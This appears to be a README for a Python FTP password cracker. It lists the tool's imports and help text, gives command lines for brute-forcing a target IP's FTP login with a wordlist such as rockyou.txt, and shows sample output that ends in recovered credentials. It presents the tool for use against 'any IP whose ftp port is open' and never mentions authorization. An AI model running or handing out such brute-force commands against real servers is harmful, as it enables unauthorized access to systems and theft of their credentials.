## Ftp-cracker(using Python) ##

**Introduction:**

A password cracker which works on open ftp port of an IP address. Provide the IP address , username and password list, it will find out the password for you.

**Requirments:--**

***Modules***

```import ftplib
from threading import Thread
import queue
from colorama import Fore, init
```

``` import argparse ```  and a ```wordlists.txt```

* Using ```ftp_cracker.py``` for fast brute-force

```python ftp_cracker.py --help```

**Output:**
``` 
usage: ftp_cracker.py [-h] [-u USER] [-p PASSLIST] [-t THREADS] host

FTP Cracker made with Python

positional arguments:
host                  The target host or IP address of the FTP server

optional arguments:
-h, --help            show this help message and exit
-u USER, --user USER  The username of target FTP server
-p PASSLIST, --passlist PASSLIST
                        The path of the pass list
-t THREADS, --threads THREADS
                        Number of workers to spawn for logining, default is 30
```
* You can use any password list , here i have provided the ``` wordlist.txt ``` , but you also can use ``` /usr/share/wordlists/rockyou.txt ``` provided in ``` kali linux ```
and for IP address choose any IP whose ftp port is open.

``` python ftp_cracker.py "IP address" -u "user name" -p wordlist.txt ```

* You can also tweak the number of threads to spawn (can be faster, default is 30):

``` python ftp_cracker.py "IP address" -u "user name" -p wordlist.txt --threads 35 ```

**Output:**
```
[+] Passwords to try: 5000
[!] Trying 123456
[!] Trying 12345
[!] Trying 123456789
[!] Trying password
[!] Trying iloveyou
[!] Trying princess
[!] Trying 12345678
[!] Trying 1234567
[!] Trying nicole
[!] Trying daniel
[!] Trying monkey
[!] Trying babygirl
[+] Found credentials: 
        Host: 192.168.0.105                                                                                                                                  
        User: Anonymous                                                                                                                                      
        Password: 123456                                                                                                                    
```        
        




